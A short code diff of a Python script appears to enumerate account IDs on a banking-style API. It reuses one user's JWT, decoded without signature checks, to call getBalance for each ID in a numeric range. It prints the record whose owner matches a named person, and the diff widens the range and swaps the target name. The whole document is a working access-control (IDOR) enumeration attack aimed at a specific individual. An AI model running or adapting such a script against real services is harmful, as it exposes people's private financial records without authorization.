@@ -16,7 +16,7 @@ if len(sys.argv) != 2:
 
 token = sys.argv[1]
 
-for i in range (1000, 9999):
+for i in range (40000, 99999):
     payload = jwt.decode(token, verify=False)
     if not ("exp" in payload and payload["exp"] >= int(time.time())):
         print("Expired Token!")
@@ -24,7 +24,7 @@ for i in range (1000, 9999):
     data = getBalance(i, token)
     if "Error" in data:
         continue
-    if data["user"] == "James Cooper":
+    if data["user"] == "Paul Ivanivsky":
         print("--- ==================================================================---")
         print(data)
         print("--- ==================================================================---")
